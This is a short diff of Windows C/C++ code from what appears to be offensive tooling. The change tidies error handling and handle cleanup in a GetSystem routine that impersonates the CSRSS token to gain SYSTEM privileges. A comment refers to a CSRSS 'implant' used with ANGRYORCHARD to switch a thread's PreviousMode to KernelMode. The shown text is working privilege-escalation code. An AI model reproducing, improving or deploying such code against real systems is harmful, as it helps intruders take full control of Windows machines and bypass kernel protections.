@@ -64,21 +64,24 @@ Cleanup:
 // Impersonate CSRSS, which runs as SYSTEM
 bool GetSystem()
 {
+    bool bResult = false;
     HANDLE hToken = NULL;
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     CsrGetProcessId_t pCsrGetProcessId = (CsrGetProcessId_t)GetProcAddress(hNtdll, "CsrGetProcessId");
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pCsrGetProcessId());
     
-    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
+    if (hProcess && OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
     {
-        CloseHandle(hProcess);
-        return ImpersonateLoggedOnUser(hToken);
+        bResult = ImpersonateLoggedOnUser(hToken);
+        CloseHandle(hToken);
     }
-
-    Log(Error, "Failed to open CSRSS's token");
+    else
+    {
+        Log(Error, "Failed to open CSRSS's token");
+    }
     
     CloseHandle(hProcess);
-    return false;
+    return bResult;
 }
 
 // Ask our CSRSS implant to set the given thread's PreviousMode to KernelMode using ANGRYORCHARD
